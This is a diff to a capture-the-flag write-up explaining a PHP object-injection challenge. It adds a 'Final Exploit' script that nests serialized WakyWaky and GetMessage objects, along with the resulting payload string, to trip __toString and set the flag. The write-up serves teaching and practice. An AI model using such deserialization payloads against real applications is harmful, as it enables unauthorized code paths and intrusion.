@@ -50,7 +50,7 @@ According to [php documentation](https://www.php.net/manual/en/language.oop5.mag
 - `__wakeup()`: Called when an object is unserialized.
 - `__toString()`: Called when an object is converted to a string.
 
-Our goal is to read the flag and to make this set the value of the getflag to true. We cannot directly create a serialized object from the `GetMessage` class because the constructor takes a parameter and checks if its value is equal to "HelloBooooooy". If it is, the script will terminate immediately, and the `__destruct()` method will not be called. On the other hand, if we change the value from "HelloBooooooy" to "Hello", the constructor will save it in the `receive` property, and the `__destruct()` method will be called. However, when it checks the value, the script will terminate again using the `die()` function. Both approaches will fail to read the flag.
+Our goal is to read the flag and to do that we need to set the value of the getflag to true. We cannot directly create a serialized object from the `GetMessage` class because the constructor takes a parameter and checks if its value is equal to "HelloBooooooy". If it is, the script will terminate immediately, and the `__destruct()` method will not be called. On the other hand, if we change the value from "HelloBooooooy" to "Hello", the constructor will save it in the `receive` property, and the `__destruct()` method will be called. However, when it checks the value, the script will terminate again using the `die()` function. Both approaches will fail to read the flag.
 
 I generate this script to create a serialized data for testing: 
 ```php
@@ -122,4 +122,41 @@ echo serialize($OuterObj);
 
 That's great, the `__toString()` called to modify the value of getflag and create an object from the `GetMessage` with `msg` of inner object which is "Hello".
 The constructor save the Hello word in `receive` property while executing else statment and then the destruct method called which it triggerd that the `receive` is not equal "HelloBooooooy" and print "[FRIEND]: Hm.. you don't seem to be the friend I was waiting for.." 
+
+Now we need to find a way to bypass these if conditions. As I mentioned before that changing the value of `recieve` will not solve the challenge, The only way to solve is to make the input that passed to the constructor is object from the `GetMessage` class. The two conditions in constructor and destructor methodes will be failed to compare between `object` and `string`, strict comparison check both variables have the same type and the same value.
+
+The Final Exploit: 
+
+```php
+<?php
+
+$getflag = false;
+
+class GetMessage {
+    public $receive;
+
+    public function __construct() {
+        $this->receive = "HelloBooooooy";
+    }
+}
+
+class WakyWaky {
+    public $msg;
+
+    public function __construct($msg) {
+        $this->msg = $msg;
+    }
+}
+
+$GetMessage_obj = new GetMessage();  
+$serializedGetMessage_obj = serialize($GetMessage_obj);  
+
+$InnerObj = new WakyWaky($GetMessage_obj);  
+$serializedInnerObj = serialize($InnerObj);  
+
+$OuterObj = new WakyWaky($InnerObj);  
+// O:8:"WakyWaky":1:{s:3:"msg";O:8:"WakyWaky":1:{s:3:"msg";O:10:"GetMessage":1:{s:7:"receive";s:13:"HelloBooooooy";}}}
+echo serialize($OuterObj); 
+
+```
 
